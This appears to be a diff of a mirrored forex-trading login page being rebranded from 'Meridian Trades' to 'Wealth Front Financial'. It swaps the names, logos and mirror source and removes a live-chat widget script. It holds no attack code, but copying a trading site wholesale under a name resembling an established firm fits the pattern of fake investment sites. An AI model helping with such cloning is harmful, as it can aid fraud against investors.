@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 
 <html lang="en">
-<!-- Mirrored from meridian-trades.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Sep 2024 10:53:20 GMT -->
+<!-- Mirrored from wf-financial.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Sep 2024 10:53:20 GMT -->
 <!-- Added by HTTrack --><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 <head>
 <!-- Required meta tags -->
-<title>Meridian Trades</title>
+<title>Wealth Front Financial</title>
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1" name="viewport"/>
-<meta content="Meridian Trades is a leading forex trading platform dedicated to empowering traders worldwide. With a commitment to innovation, expertise, and customer satisfaction, we provide a state-of-the-art trading environment that caters to both novice and experienced traders. Our platform offers real-time data, advanced charting tools, and comprehensive educational resources, ensuring our clients have the knowledge and tools they need to succeed.
+<meta content="Wealth Front Financial is a leading forex trading platform dedicated to empowering traders worldwide. With a commitment to innovation, expertise, and customer satisfaction, we provide a state-of-the-art trading environment that caters to both novice and experienced traders. Our platform offers real-time data, advanced charting tools, and comprehensive educational resources, ensuring our clients have the knowledge and tools they need to succeed.
 
-At Meridian Trades, we prioritize security, transparency, and personalized support, making us your trusted partner in navigating the dynamic world of forex trading. Join us and elevate your trading experience with Meridian Trades.
+At Wealth Front Financial, we prioritize security, transparency, and personalized support, making us your trusted partner in navigating the dynamic world of forex trading. Join us and elevate your trading experience with Wealth Front Financial.
 " name="description">
 
 <meta content="" name="keywords">
@@ -18,7 +18,7 @@ At Meridian Trades, we prioritize security, transparency, and personalized suppo
 
 
 <!-- Favicon icon-->
-<link href="{{ asset('assets/20240603081058logo-bc-full') }}" rel="shortcut icon" type="image/x-icon"/>
+<link href="{{ asset('assets/logo.png') }}" rel="shortcut icon" type="image/x-icon"/>
 <!-- Libs CSS -->
 <!-- Google Font -->
 <link href="https://fonts.googleapis.com/css2?family=Reenie+Beanie&amp;family=Rubik:wght@400;500;700&amp;family=Spartan:wght@400;700;900&amp;display=swap" rel="stylesheet"/>
@@ -101,7 +101,7 @@ Sign in START -->
 <div class="justify-content-center align-self-center">
 <!-- Logo START -->
 <a class="navbar-brand" href="{{ route('index') }}">
-<img class="navbar-brand-item" src="{{ asset('assets/20240603081058logo-bc-full.png') }}" style="height: 70px;"/>
+<img class="navbar-brand-item" src="{{ asset('assets/logo-removebg-preview.png') }}" style="height: 70px;"/>
 </a>
 <!-- Logo END -->
 </div>
@@ -281,21 +281,6 @@ JS libraries, plugins and custom scripts -->
 
 
 
-<!-- Smartsupp Live Chat script -->
-<script type="text/javascript">
-var _smartsupp = _smartsupp || {};
-_smartsupp.key = 'dc293b4ebc86d38b5f65867f520ce6194afb2e9a';
-window.smartsupp||(function(d) {
-  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-  c.type='text/javascript';c.charset='utf-8';c.async=true;
-  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
-})(document);
-</script>
-<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
-
-
-
 </body>
-<!-- Mirrored from meridian-trades.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Sep 2024 10:53:23 GMT -->
+<!-- Mirrored from wf-financial.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Sep 2024 10:53:23 GMT -->
 </html>
